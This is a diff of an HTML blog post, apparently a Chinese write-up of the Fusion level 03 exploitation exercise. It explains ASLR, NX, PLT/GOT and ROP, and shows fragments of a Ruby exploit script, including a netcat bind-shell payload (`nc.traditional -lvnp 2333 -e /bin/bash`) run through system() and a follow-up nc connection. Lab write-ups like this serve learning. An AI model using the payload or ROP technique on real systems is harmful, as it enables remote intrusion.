@@ -519,11 +519,11 @@ if (!doNotTrack) {
 <p>我们遇到的限制是：</p>
 <ul>
 <li>
-<p>开了 ASLR<!-- raw HTML omitted -->
+<p>开了 ASLR<br>
 → libc 的地址会变，堆栈每次的地址也会变</p>
 </li>
 <li>
-<p>开了 NX<!-- raw HTML omitted -->
+<p>开了 NX<br>
 → 就算能往堆栈上扔 shellcode 也没法执行</p>
 </li>
 </ul>
@@ -533,14 +533,14 @@ if (!doNotTrack) {
 <p>bof 修改返回地址</p>
 </li>
 <li>
-<p>没开 PIE 所以还是可以 ROP<!-- raw HTML omitted -->
+<p>没开 PIE 所以还是可以 ROP<br>
 → 只要知道一个 libc 函数的地址，就可以算出别的函数的偏移量</p>
 </li>
 </ul>
 <p>以及，我们最终想要达到的效果是：</p>
 <ul>
-<li>用 system 函数绑定 tcp shell<!-- raw HTML omitted -->
-→ <code>system(&quot;/bin/nc.traditional -lvnp 2333 -e /bin/bash&quot;);</code><!-- raw HTML omitted -->
+<li>用 system 函数绑定 tcp shell<br>
+→ <code>system(&quot;/bin/nc.traditional -lvnp 2333 -e /bin/bash&quot;);</code><br>
 → 注意得用 nc.traditional 否则是 netcat-openbsd，没有 -e 选项</li>
 </ul>
 <hr>
@@ -798,9 +798,9 @@ if (!doNotTrack) {
 <p>也就是：</p>
 <ol>
 <li><code>call &lt;write@plt&gt;</code>，于是跳到了 plt</li>
-<li>plt 会看看 got 有没有写上真正的 libc 里的 write 的地址（libc 地址会受 ASLR 影响<!-- raw HTML omitted -->
-→ 有：直接跳到 got 里的记录<!-- raw HTML omitted -->
-→ 没有：就跳 ld.so 来找，然后写进 got<!-- raw HTML omitted -->
+<li>plt 会看看 got 有没有写上真正的 libc 里的 write 的地址（libc 地址会受 ASLR 影响<br>
+→ 有：直接跳到 got 里的记录<br>
+→ 没有：就跳 ld.so 来找，然后写进 got<br>
 之后再遇到 <code>call &lt;write@plt&gt;</code> 的话，plt 就可以直接跳 got 记录了</li>
 </ol>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># 这是 got 记录</span>
@@ -909,7 +909,7 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>Program received signal SIGSEGV, Segmentation fault.
 </span></span><span style="display:flex;"><span>0x44434241 in ?? <span style="color:#f92672">()</span>
 </span></span></code></pre></div><p>没问题&hellip;能用</p>
-<!-- raw HTML omitted -->
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=27118629&auto=0&height=66"></iframe>
 <p>绕了这么多路终于快解决了吧..</p>
 <p>然后替换成我们的 ROP Chain：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">p32</span> addr
@@ -1017,7 +1017,28 @@ if (!doNotTrack) {
 ＼｜ーーーーーーーーーーーーーーーーーーー｜
 　＼
 </code></pre><hr>
-<!-- raw HTML omitted -->
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
 <h2 id="the-true-solution">The TRUE Solution</h2>
 <p>严格来说，gContents 这个变量，在 .bss 段内；</p>
 <blockquote>
@@ -1259,7 +1280,7 @@ if (!doNotTrack) {
 <p>GNU indirect function (ifunc) is a mechanism making a direct function call resolve to an implementation picked by a resolver. It is mainly used in glibc but has adoption in FreeBSD.</p>
 <p>For some performance critical functions, e.g. memcpy/memset/strcpy, glibc provides multiple implementations optimized for different architecture levels. The application just uses memcpy(&hellip;) which compiles to call memcpy. The linker will create a PLT for memcpy and produce an associated special dynamic relocation referencing the resolver symbol/address. During relocation resolving at runtime, the return value of the resolver will be placed in the GOT entry and the PLT entry will load the address.</p>
 <p>On Mach-O, there is a similar feature called N_SYMBOL_RESOLVER.
-<!-- raw HTML omitted --></p>
+<br></p>
 <p><a class="link" href="http://maskray.me/blog/2021-01-18-gnu-indirect-function"  target="_blank" rel="noopener"
     >GNU indirect function - MaskRay</a></p>
 </blockquote>
@@ -1432,7 +1453,8 @@ if (!doNotTrack) {
 ></p>
 <hr>
 <p>最后是完整的脚本</p>
-<!-- raw HTML omitted -->
+<details>
+<summary>展开...</summary>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/ruby</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># encoding: ASCII-8BIT</span>
 </span></span><span style="display:flex;"><span>
@@ -1565,8 +1587,9 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>$socket<span style="color:#f92672">.</span>close_write
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>system <span style="color:#e6db74">&#34;nc </span><span style="color:#e6db74">#{</span>hostname<span style="color:#e6db74">}</span><span style="color:#e6db74"> 2333&#34;</span>
-</span></span></code></pre></div><!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+</span></span></code></pre></div></details>
+<br>
+加了英文注释本来是想上传 GitHub 的
 <p>但是姑且还是把 Fusion 的题目全做完了再一起传吧</p>
 <p>以及草稿</p>
 <p><img src="/p/fusion_level_03/trial_and_error.png"
@@ -1585,7 +1608,7 @@ if (!doNotTrack) {
 ></p>
 <p>真的试了好多好多次&hellip;</p>
 <p>前后加起来有三个星期才总算把这个做出来</p>
-<!-- raw HTML omitted -->
+<br>
 <p>从因为疫情被封的三月中旬到现在，也就两个半月的时间</p>
 <p>真的学到了好多&hellip;</p>
 <p>从完全不会 pwn 到 现在第一次自己成功 ROP</p>
